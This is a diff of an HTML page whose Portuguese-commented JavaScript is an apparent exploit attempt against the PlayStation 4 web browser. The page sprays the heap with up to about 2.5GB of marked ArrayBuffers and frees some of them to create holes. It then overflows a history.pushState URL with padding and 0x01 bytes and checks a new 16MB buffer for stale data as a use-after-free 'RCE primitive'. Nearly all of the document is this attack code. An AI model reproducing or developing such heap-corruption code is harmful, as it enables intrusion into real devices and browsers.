@@ -1,112 +1,134 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 Fake Chunk Attack</title>
+    <title>PS4 Heap Exhaustion Attack</title>
     <style>
-        body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
-        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #00ff00; background: #111; color: #fff; cursor: pointer; }
-        #log { margin-top: 20px; border: 1px solid #333; padding: 10px; color: cyan; height: 300px; overflow-y: scroll; }
+        body { background-color: #000; color: #ff00ff; font-family: monospace; padding: 20px; }
+        button { font-size: 24px; padding: 25px; width: 100%; border: 2px solid #ff00ff; background: #111; color: #fff; cursor: pointer; }
+        #log { margin-top: 20px; border: 1px solid #555; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; background: #111;}
+        .win { background-color: #ff00ff; color: #000; font-weight: bold; font-size: 1.2em; }
     </style>
 </head>
 <body>
 
-    <h1>Ataque de Chunk Falso (16MB)</h1>
-    <p>Teoria: Transformamos o vizinho em um bloco livre de 16MB.</p>
+    <h1>O Aperto (Heap Exhaustion)</h1>
+    <p>Encher a RAM para forçar a reutilização do Chunk Falso.</p>
 
-    <button onclick="startFakeChunk()">ALOCAR 16MB NO CHUNK FALSO</button>
+    <button onclick="startSqueeze()">INICIAR PRESSÃO DE MEMÓRIA</button>
     <div id="log">Pronto. Reinicie o console.</div>
 
     <script>
         const ALIGNED_OFFSET = 709520;
-        // Overflow suficiente para cobrir alguns cabeçalhos (64KB)
         const OVERFLOW_AMT = 1024 * 64; 
-        
-        // O valor 0x01010101 é aprox 16MB.
-        // Vamos tentar alocar um buffer desse tamanho.
-        const FAKE_SIZE = 16843009; 
+        const FAKE_SIZE = 16843009; // ~16MB (0x01010101)
 
-        function log(msg) {
-            document.getElementById('log').innerHTML += `<div>${msg}</div>`;
+        // Arrays para segurar a memória
+        var filler = [];
+        
+        function log(msg, type) {
+            const el = document.getElementById('log');
+            let style = type === 'win' ? 'class="win"' : '';
+            el.innerHTML += `<div ${style}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            el.scrollTop = el.scrollHeight;
         }
 
-        async function startFakeChunk() {
-            log("1. Preparando terreno (Heap Spray leve)...");
-            
-            // Cria alguns arrays para servirem de "vitima de sobreposição"
-            var victims = [];
-            for(let i=0; i<100; i++) {
-                let ab = new ArrayBuffer(1024 * 128); // 128KB
-                let view = new Uint8Array(ab);
-                view[0] = 0xAA; // Marca
-                victims.push(ab);
+        async function startSqueeze() {
+            log("1. Enchendo a memória RAM (Spray Massivo)...");
+
+            // FASE 1: ENCHER A RAM
+            // Vamos alocar blocos de 1MB até o navegador gritar
+            let count = 0;
+            try {
+                while(true) {
+                    let ab = new ArrayBuffer(1024 * 1024 * 1); // 1MB
+                    let view = new Uint8Array(ab);
+                    // Marcamos tudo com 0xAA para reconhecer depois
+                    // Preenchemos apenas o início para ser rápido
+                    view[0] = 0xAA; 
+                    view[1] = 0xBB;
+                    filler.push(ab);
+                    count++;
+                    
+                    // Pausa a cada 50MB para não travar a UI totalmente
+                    if(count % 50 === 0) {
+                        log(`Alocados: ${count} MB...`);
+                        await new Promise(r => setTimeout(r, 10));
+                    }
+                    
+                    // Limite de segurança para não travar o OS inteiro, só o browser
+                    if (count > 2500) break; // 2.5GB (Provavelmente vai parar antes)
+                }
+            } catch(e) {
+                log(`Memória cheia atingida em ${count} MB! (Erro esperado: ${e.message})`);
             }
 
-            // Cria buracos
-            for(let i=0; i<100; i+=2) victims[i] = null;
+            log("2. Liberando pequenos espaços (Queijo Suíço)...");
             
-            // Força GC para que os buracos virem "Free Chunks"
+            // Liberamos alguns blocos perto do fim para criar espaço para o exploit cair
+            // Mas mantemos a pressão alta
+            let victimIndex = filler.length - 20;
+            if (victimIndex < 0) victimIndex = 0;
+            
+            // Soltamos 10 blocos recentes para criar o buraco onde o pushState vai entrar
+            for(let i=0; i<10; i++) {
+                if (filler[victimIndex + i]) filler[victimIndex + i] = null;
+            }
+            
             await forceGC();
 
-            log("2. Disparando Exploit (Criando Fake Chunk)...");
-            
+            log("3. Disparando Exploit (Corrompendo vizinho)...");
+
             setTimeout(() => {
                 try {
-                    // Escreve 0x01010101 nos cabeçalhos livres
+                    // Overflow
                     let buffer = "A".repeat(ALIGNED_OFFSET);
                     buffer += "\x01".repeat(OVERFLOW_AMT);
                     
-                    history.pushState({}, "fake_chunk", "/" + buffer);
+                    history.pushState({}, "squeeze", "/" + buffer);
 
-                    log("3. Solicitando alocação de ~16MB...");
-                    attemptBadAlloc(victims);
+                    // FASE 4: ALOCAÇÃO FORÇADA
+                    // Agora pedimos o bloco de 16MB. 
+                    // Como a RAM está cheia, ele DEVE tentar reusar algo.
+                    log("4. Solicitando o Fake Chunk de 16MB...");
+                    checkFakeChunk();
 
                 } catch (e) {
-                    log("Erro: " + e.message);
+                    log("Erro no Exploit: " + e.message);
                 }
             }, 500);
         }
 
-        function attemptBadAlloc(victims) {
+        function checkFakeChunk() {
             try {
-                // Aqui está o segredo: Pedimos o tamanho exato que forjamos
+                // Tenta alocar o bloco de 16MB
                 let ghostBuffer = new ArrayBuffer(FAKE_SIZE);
                 let ghostView = new Uint8Array(ghostBuffer);
-                
-                // Se o sistema nos deu o bloco falso, esse bloco vai estar 
-                // "em cima" das vítimas que sobraram (0xAA).
-                
-                log("Alocação bem sucedida! Verificando sobreposição...");
-                
-                // Escrevemos no buffer fantasma
-                ghostView[0] = 0xFF;
-                ghostView[1000] = 0xFF;
-                ghostView[100000] = 0xFF;
 
-                // Verificamos se as vítimas mudaram
-                let success = false;
-                for(let i=1; i<victims.length; i+=2) {
-                    let v = victims[i];
-                    if(!v) continue;
-                    
-                    let view = new Uint8Array(v);
-                    if (view[0] !== 0xAA) {
-                        log(`<h1 style='color:red'>!!! SUCESSO !!! Vítima ${i} atropelada!</h1>`);
-                        alert("FAKE CHUNK OVERLAP!");
-                        success = true;
-                        break;
-                    }
-                }
+                log("Alocação de 16MB conseguiu espaço!");
                 
-                if(!success) log("Alocação ocorreu, mas não achamos a sobreposição.");
+                // VERIFICAÇÃO DE OURO:
+                // Se esse buffer novo tiver dados antigos (0xAA), é UAF.
+                
+                if (ghostView[0] === 0xAA && ghostView[1] === 0xBB) {
+                    log("!!! JACKPOT !!!", 'win');
+                    log("O novo buffer contém dados antigos (Use-After-Free)!", 'win');
+                    alert("RCE PRIMITIVE: MEMORY REUSE!");
+                } else if (ghostView[0] === 0) {
+                    log("Falha: O sistema nos deu memória limpa (zerada).");
+                    log("A pressão de memória não foi suficiente ou o isolamento venceu.");
+                } else {
+                    log("Interessante... O buffer tem dados desconhecidos: " + ghostView[0]);
+                }
 
             } catch(e) {
-                log("Alocação falhou (O sistema percebeu o erro?): " + e.message);
+                log("Falha na alocação (OOM real): " + e.message);
+                log("O sistema não conseguiu achar um bloco de 16MB nem reciclando.");
             }
         }
 
         async function forceGC() {
-            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
-            return new Promise(r => setTimeout(r, 800));
+            try { new ArrayBuffer(10 * 1024 * 1024); } catch(e){}
+            return new Promise(r => setTimeout(r, 500));
         }
     </script>
 </body>
